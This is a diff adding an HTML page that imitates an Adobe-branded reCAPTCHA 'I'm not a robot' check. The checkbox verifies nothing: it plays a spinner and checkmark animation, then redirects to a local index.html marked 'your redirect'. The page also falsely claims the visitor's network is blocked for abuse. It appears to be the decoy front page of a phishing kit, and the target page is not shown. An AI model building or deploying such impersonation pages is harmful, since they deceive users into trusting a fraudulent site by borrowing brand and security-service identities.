@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>I'm not a robot</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #222;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 320px;
+      margin: 40px 15px;
+      padding: 5px;
+    }
+
+    .adobe {
+      height: 22px;
+      margin-bottom: 5px;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin: 5px 0 20px;
+      font-weight: normal;
+    }
+
+    .recaptcha-box {
+      border: 1px solid #d3d3d3;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      border-radius: 3px;
+      background: #fafafa;
+      cursor: pointer;
+      position: relative;
+    }
+
+    .checkbox {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #c1c1c1;
+      margin-right: 15px;
+      cursor: pointer;
+      position: relative;
+      background: #fff;
+      overflow: hidden;
+      border-radius: 2px;
+    }
+
+    .checkbox.loading::after {
+      content: "";
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #ccc;
+      border-top: 3px solid orange;
+      border-radius: 50%;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      animation: spin 1s linear infinite;
+    }
+
+    .checkbox.checked::after {
+      content: "";
+      position: absolute;
+      width: 8px;
+      height: 16px;
+      border: solid orange;
+      border-width: 0 3px 3px 0;
+      transform: rotate(45deg);
+      top: 2px;
+      left: 8px;
+      animation: pop 0.2s ease-in-out;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0) rotate(45deg); opacity: 0; }
+      100% { transform: scale(1) rotate(45deg); opacity: 1; }
+    }
+
+    .label {
+      font-size: 16px;
+    }
+
+    .recaptcha-brand {
+      margin-left: auto;
+      text-align: center;
+      font-size: 10px;
+      color: #666;
+    }
+
+    .recaptcha-brand img {
+      width: 50px;
+      margin-bottom: 2px;
+    }
+
+    .about {
+      margin-top: 20px;
+      font-size: 14px;
+      line-height: 1.45;
+      color: #444;
+    }
+
+    .about strong {
+      font-size: 15px;
+      color: #000;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+
+    <img class="adobe" src="https://www.adobe.com/federal/assets/svgs/adobe-logo.svg">
+    <h1>adobe.com</h1>
+
+    <div class="recaptcha-box" onclick="verifyUser()">
+      <div class="checkbox" id="check"></div>
+      <div class="label">I'm not a robot</div>
+
+      <div class="recaptcha-brand">
+        <img src="https://cf-assets.www.cloudflare.com/dzlvafdwdttg/69wNwfiY5mFmgpd9eQFW6j/d5131c08085a977aa70f19e7aada3fa9/1pixel-down__1_.svg" alt="">
+        <div>reCAPTCHA</div>
+      </div>
+    </div>
+
+    <div class="about">
+      <strong>About this page</strong>
+      <p>
+        This network is blocked due to unaddressed abuse complaints about malicious behavior.
+        This page checks to see if it's really a human sending the requests and not a robot
+        coming from this network.
+      </p>
+    </div>
+
+  </div>
+
+  <script>
+    function verifyUser() {
+      const checkbox = document.getElementById("check");
+
+      if (checkbox.classList.contains("checked") || checkbox.classList.contains("loading")) return;
+
+      checkbox.classList.add("loading");
+
+      setTimeout(() => {
+        checkbox.classList.remove("loading");
+        checkbox.classList.add("checked");
+
+        setTimeout(() => {
+          window.location.href = "./index.html"; // your redirect
+        }, 1500);
+
+      }, 2000);
+    }
+  </script>
+
+</body>
+</html>
